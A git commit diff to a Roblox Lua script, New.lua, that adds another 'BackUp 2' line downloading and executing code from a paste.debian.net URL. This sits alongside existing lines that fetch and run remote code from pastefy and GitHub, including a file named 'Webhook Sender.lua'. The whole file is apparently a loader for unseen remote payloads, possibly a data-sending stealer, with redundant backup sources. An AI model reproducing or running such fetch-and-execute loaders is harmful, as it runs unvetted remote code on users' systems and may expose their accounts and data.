da9fd731539492e083551f34dfdce9a0c8c78959
RblxScriptsOG <faithsmiley.robloxscripts@gmail.com>
2025-07-15 18:02:24 +0500

    Update New.lua

--- New.lua
+++ New.lua
@@ -4,3 +4,5 @@ loadstring(game:HttpGet("https://pastefy.app/bUivM5E5/raw"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Rblx.Scripts/refs/heads/main/Webhook%20Sender.lua"))()
 -- Backup
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Rblx.Scripts/refs/heads/main/Script.txt"))()
+-- BackUp 2
+loadstring(game:HttpGet("https://paste.debian.net/plainh/3886e39f/", true))()
